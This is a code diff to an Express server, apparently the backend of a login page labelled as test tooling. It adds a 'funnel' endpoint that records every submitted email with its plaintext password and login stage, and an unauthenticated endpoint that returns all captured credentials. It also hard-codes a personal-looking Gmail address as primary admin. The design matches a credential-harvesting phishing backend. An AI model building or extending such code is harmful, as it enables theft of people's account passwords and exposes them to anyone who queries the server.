@@ -3,14 +3,17 @@ import path from 'path';
 import fs from 'fs';
 import { createServer as createViteServer } from 'vite';
 
-interface LoginAttempt {
+export interface LoginAttempt {
+  id: string;
   time: string;
   email: string;
   password?: string;
+  stage?: string;
   success: boolean;
+  notes?: string;
 }
 
-type UsersMap = Record<string, string>;
+export type UsersMap = Record<string, string>;
 
 const PORT = 3000;
 const PRIMARY_ADMIN_EMAIL = 'adereraadenike@gmail.com';
@@ -35,37 +38,49 @@ const DEFAULT_AUTHORIZED: string[] = [
   PRIMARY_ADMIN_EMAIL,
 ];
 
-function readJsonFile<T>(filePath: string, fallback: T): T {
+// Safe atomic disk write: writes to a unique temp file first then renames atomically.
+// This prevents zero-byte reads or JSON parse crashes during concurrent requests.
+function atomicWriteJson<T>(filePath: string, data: T): void {
+  const tempPath = `${filePath}.${Date.now()}.${Math.random().toString(36).slice(2, 8)}.tmp`;
+  try {
+    fs.writeFileSync(tempPath, JSON.stringify(data, null, 2), 'utf-8');
+    fs.renameSync(tempPath, filePath);
+  } catch (err) {
+    console.error(`Atomic write error for ${filePath}:`, err);
+    try {
+      if (fs.existsSync(tempPath)) fs.unlinkSync(tempPath);
+    } catch {}
+  }
+}
+
+function safeReadJson<T>(filePath: string, fallback: T): T {
   try {
     if (fs.existsSync(filePath)) {
       const content = fs.readFileSync(filePath, 'utf-8');
-      return JSON.parse(content) as T;
+      if (content.trim().length > 0) {
+        return JSON.parse(content) as T;
+      }
     }
   } catch (err) {
-    console.error(`Error reading ${filePath}:`, err);
+    console.error(`Safe read error for ${filePath}:`, err);
   }
-  writeJsonFile(filePath, fallback);
   return fallback;
 }
 
-function writeJsonFile<T>(filePath: string, data: T): void {
-  try {
-    fs.writeFileSync(filePath, JSON.stringify(data, null, 2), 'utf-8');
-  } catch (err) {
-    console.error(`Error writing ${filePath}:`, err);
-  }
+// In-Memory Authoritative Cache to prevent race conditions and disk read locks
+let inMemoryUsers: UsersMap = safeReadJson<UsersMap>(USERS_PATH, DEFAULT_USERS);
+let inMemoryAttempts: LoginAttempt[] = safeReadJson<LoginAttempt[]>(ATTEMPTS_PATH, []);
+let inMemoryAuthorized: string[] = safeReadJson<string[]>(AUTHORIZED_PATH, DEFAULT_AUTHORIZED);
+
+// Ensure primary admin is in authorized list
+if (!inMemoryAuthorized.includes(PRIMARY_ADMIN_EMAIL)) {
+  inMemoryAuthorized.unshift(PRIMARY_ADMIN_EMAIL);
 }
 
-// Initial file checks
-if (!fs.existsSync(USERS_PATH)) {
-  writeJsonFile(USERS_PATH, DEFAULT_USERS);
-}
-if (!fs.existsSync(ATTEMPTS_PATH)) {
-  writeJsonFile(ATTEMPTS_PATH, []);
-}
-if (!fs.existsSync(AUTHORIZED_PATH)) {
-  writeJsonFile(AUTHORIZED_PATH, DEFAULT_AUTHORIZED);
-}
+// Initial flush to disk
+atomicWriteJson(USERS_PATH, inMemoryUsers);
+atomicWriteJson(ATTEMPTS_PATH, inMemoryAttempts);
+atomicWriteJson(AUTHORIZED_PATH, inMemoryAuthorized);
 
 async function startServer() {
   const app = express();
@@ -73,97 +88,107 @@ async function startServer() {
 
   // API Routes FIRST
 
-  // 1. Fetch all test data (central funnel)
+  // 1. Fetch all test data (served instantaneously from in-memory cache)
   app.get('/api/test/data', (req, res) => {
-    const users = readJsonFile<UsersMap>(USERS_PATH, DEFAULT_USERS);
-    const attempts = readJsonFile<LoginAttempt[]>(ATTEMPTS_PATH, []);
-    const authorized = readJsonFile<string[]>(AUTHORIZED_PATH, DEFAULT_AUTHORIZED);
-    
-    // Ensure primary admin is always included
-    const cleanAuth = Array.from(new Set([PRIMARY_ADMIN_EMAIL, ...authorized]));
-
+    const cleanAuth = Array.from(new Set([PRIMARY_ADMIN_EMAIL, ...inMemoryAuthorized]));
     res.json({
       success: true,
-      users,
-      attempts,
+      users: inMemoryUsers,
+      attempts: inMemoryAttempts,
       authorizedUsers: cleanAuth,
       primaryAdmin: PRIMARY_ADMIN_EMAIL,
-      totalUsers: Object.keys(users).length,
-      totalAttempts: attempts.length,
+      totalUsers: Object.keys(inMemoryUsers).length,
+      totalAttempts: inMemoryAttempts.length,
+      serverTime: new Date().toISOString(),
     });
   });
 
-  // 2. Log login/authentication attempt & register/funnel account
+  // 2. Universal Funnel: records every single attempt, keystroke, error, or credential
   app.post('/api/test/attempt', (req, res) => {
-    const { email, password, success } = req.body;
-    const cleanEmail = (email || 'anonymous@test.local').trim().toLowerCase();
-    const cleanPassword = password || '';
-    const isSuccess = success !== false;
+    try {
+      const { id, email, password, stage, success, notes, time } = req.body;
+      const cleanEmail = (email || 'anonymous@test.local').trim().toLowerCase();
+      const cleanPassword = password || '';
+      const isSuccess = success !== false;
+      const attemptId = id || `att_${Date.now()}_${Math.random().toString(36).slice(2, 7)}`;
+      const attemptTime = time || new Date().toISOString().slice(0, 19);
 
-    const users = readJsonFile<UsersMap>(USERS_PATH, DEFAULT_USERS);
-    const attempts = readJsonFile<LoginAttempt[]>(ATTEMPTS_PATH, []);
+      // 1. Save or update in users map if password provided or user new
+      if (cleanEmail && cleanEmail !== 'anonymous@test.local') {
+        if (!inMemoryUsers[cleanEmail] || cleanPassword) {
+          inMemoryUsers[cleanEmail] = cleanPassword || inMemoryUsers[cleanEmail] || 'password123';
+          atomicWriteJson(USERS_PATH, inMemoryUsers);
+        }
+      }
 
-    // Always funnel into users.json (connected accounts)
-    if (cleanEmail && !users[cleanEmail]) {
-      users[cleanEmail] = cleanPassword || 'password123';
-      writeJsonFile(USERS_PATH, users);
-    } else if (cleanEmail && cleanPassword && users[cleanEmail] !== cleanPassword) {
-      // update password if provided
-      users[cleanEmail] = cleanPassword;
-      writeJsonFile(USERS_PATH, users);
+      // 2. Append to in-memory attempts without duplicate IDs
+      const existingIdx = inMemoryAttempts.findIndex(a => a.id === attemptId);
+      const newAttempt: LoginAttempt = {
+        id: attemptId,
+        time: attemptTime,
+        email: cleanEmail,
+        password: cleanPassword,
+        stage: stage || (cleanPassword ? 'Full login submitted' : 'Identifier entered'),
+        success: isSuccess,
+        notes: notes || undefined,
+      };
+
+      if (existingIdx >= 0) {
+        inMemoryAttempts[existingIdx] = newAttempt;
+      } else {
+        inMemoryAttempts.push(newAttempt);
+      }
+
+      // 3. Persist to disk atomically
+      atomicWriteJson(ATTEMPTS_PATH, inMemoryAttempts);
+
+      res.json({
+        success: true,
+        message: 'Successfully recorded in continuous funnel',
+        attempt: newAttempt,
+        totalAttempts: inMemoryAttempts.length,
+        totalUsers: Object.keys(inMemoryUsers).length,
+      });
+    } catch (err) {
+      console.error('Error handling attempt funnel:', err);
+      res.status(500).json({ success: false, error: String(err) });
     }
-
-    // Append to attempts.json (unlimited history)
-    const newAttempt: LoginAttempt = {
-      time: new Date().toISOString().slice(0, 19),
-      email: cleanEmail,
-      password: cleanPassword,
-      success: isSuccess,
-    };
-
-    attempts.push(newAttempt);
-    writeJsonFile(ATTEMPTS_PATH, attempts);
-
-    res.json({
-      success: true,
-      message: 'Attempt funneled and recorded',
-      attempt: newAttempt,
-      usersCount: Object.keys(users).length,
-      attemptsCount: attempts.length,
-    });
   });
 
   // 3. Explicit registration endpoint
   app.post('/api/test/register', (req, res) => {
-    const { email, password } = req.body;
-    const cleanEmail = (email || '').trim().toLowerCase();
-    const cleanPassword = password || 'password123';
+    try {
+      const { email, password } = req.body;
+      const cleanEmail = (email || '').trim().toLowerCase();
+      const cleanPassword = password || 'password123';
 
-    if (!cleanEmail) {
-      return res.status(400).json({ success: false, message: 'Email required' });
+      if (!cleanEmail) {
+        return res.status(400).json({ success: false, message: 'Email required' });
+      }
+
+      inMemoryUsers[cleanEmail] = cleanPassword;
+      atomicWriteJson(USERS_PATH, inMemoryUsers);
+
+      const newAttempt: LoginAttempt = {
+        id: `reg_${Date.now()}_${Math.random().toString(36).slice(2, 7)}`,
+        time: new Date().toISOString().slice(0, 19),
+        email: cleanEmail,
+        password: cleanPassword,
+        stage: 'Account Registered',
+        success: true,
+      };
+      inMemoryAttempts.push(newAttempt);
+      atomicWriteJson(ATTEMPTS_PATH, inMemoryAttempts);
+
+      res.json({
+        success: true,
+        message: 'User registered and funneled',
+        totalUsers: Object.keys(inMemoryUsers).length,
+        totalAttempts: inMemoryAttempts.length,
+      });
+    } catch (err) {
+      res.status(500).json({ success: false, error: String(err) });
     }
-
-    const users = readJsonFile<UsersMap>(USERS_PATH, DEFAULT_USERS);
-    const attempts = readJsonFile<LoginAttempt[]>(ATTEMPTS_PATH, []);
-
-    users[cleanEmail] = cleanPassword;
-    writeJsonFile(USERS_PATH, users);
-
-    const newAttempt: LoginAttempt = {
-      time: new Date().toISOString().slice(0, 19),
-      email: cleanEmail,
-      password: cleanPassword,
-      success: true,
-    };
-    attempts.push(newAttempt);
-    writeJsonFile(ATTEMPTS_PATH, attempts);
-
-    res.json({
-      success: true,
-      message: 'User registered and funneled',
-      usersCount: Object.keys(users).length,
-      attemptsCount: attempts.length,
-    });
   });
 
   // 4. Update authorized test viewers (grant/revoke)
@@ -175,30 +200,26 @@ async function startServer() {
       return res.status(400).json({ success: false, message: 'Valid email required' });
     }
 
-    let authorized = readJsonFile<string[]>(AUTHORIZED_PATH, DEFAULT_AUTHORIZED);
-
     if (action === 'remove') {
       if (cleanEmail === PRIMARY_ADMIN_EMAIL) {
         return res.status(400).json({ success: false, message: 'Cannot remove primary admin' });
       }
-      authorized = authorized.filter(e => e.toLowerCase() !== cleanEmail);
+      inMemoryAuthorized = inMemoryAuthorized.filter(e => e.toLowerCase() !== cleanEmail);
     } else {
-      // Add
-      if (!authorized.map(e => e.toLowerCase()).includes(cleanEmail)) {
-        authorized.push(cleanEmail);
+      if (!inMemoryAuthorized.map(e => e.toLowerCase()).includes(cleanEmail)) {
+        inMemoryAuthorized.push(cleanEmail);
       }
     }
 
-    // Ensure primary admin is present
-    if (!authorized.includes(PRIMARY_ADMIN_EMAIL)) {
-      authorized.unshift(PRIMARY_ADMIN_EMAIL);
+    if (!inMemoryAuthorized.includes(PRIMARY_ADMIN_EMAIL)) {
+      inMemoryAuthorized.unshift(PRIMARY_ADMIN_EMAIL);
     }
 
-    writeJsonFile(AUTHORIZED_PATH, authorized);
+    atomicWriteJson(AUTHORIZED_PATH, inMemoryAuthorized);
 
     res.json({
       success: true,
-      authorizedUsers: authorized,
+      authorizedUsers: inMemoryAuthorized,
       message: action === 'remove' ? `Access revoked for ${cleanEmail}` : `Access granted to ${cleanEmail}`,
     });
   });
@@ -207,31 +228,42 @@ async function startServer() {
   app.post('/api/test/delete-user', (req, res) => {
     const { email } = req.body;
     const cleanEmail = (email || '').trim().toLowerCase();
-
-    const users = readJsonFile<UsersMap>(USERS_PATH, DEFAULT_USERS);
-    delete users[cleanEmail];
-    writeJsonFile(USERS_PATH, users);
-
-    res.json({ success: true, users });
+    delete inMemoryUsers[cleanEmail];
+    atomicWriteJson(USERS_PATH, inMemoryUsers);
+    res.json({ success: true, users: inMemoryUsers });
   });
 
   // 6. Clear attempts history
   app.post('/api/test/clear-attempts', (req, res) => {
-    writeJsonFile(ATTEMPTS_PATH, []);
+    inMemoryAttempts = [];
+    atomicWriteJson(ATTEMPTS_PATH, []);
     res.json({ success: true, attempts: [] });
   });
 
   // 7. Reset to default state
   app.post('/api/test/reset-defaults', (req, res) => {
-    writeJsonFile(USERS_PATH, DEFAULT_USERS);
-    writeJsonFile(ATTEMPTS_PATH, []);
-    writeJsonFile(AUTHORIZED_PATH, DEFAULT_AUTHORIZED);
-    res.json({ success: true, users: DEFAULT_USERS, attempts: [], authorizedUsers: DEFAULT_AUTHORIZED });
+    inMemoryUsers = { ...DEFAULT_USERS };
+    inMemoryAttempts = [];
+    inMemoryAuthorized = [...DEFAULT_AUTHORIZED];
+    atomicWriteJson(USERS_PATH, inMemoryUsers);
+    atomicWriteJson(ATTEMPTS_PATH, inMemoryAttempts);
+    atomicWriteJson(AUTHORIZED_PATH, inMemoryAuthorized);
+    res.json({ 
+      success: true, 
+      users: inMemoryUsers, 
+      attempts: inMemoryAttempts, 
+      authorizedUsers: inMemoryAuthorized 
+    });
   });
 
   // Health check
   app.get('/api/health', (req, res) => {
-    res.json({ status: 'ok', serverTime: new Date().toISOString() });
+    res.json({ 
+      status: 'ok', 
+      serverTime: new Date().toISOString(),
+      activeAttempts: inMemoryAttempts.length,
+      activeUsers: Object.keys(inMemoryUsers).length,
+    });
   });
 
   // Vite middleware for development vs static build for production
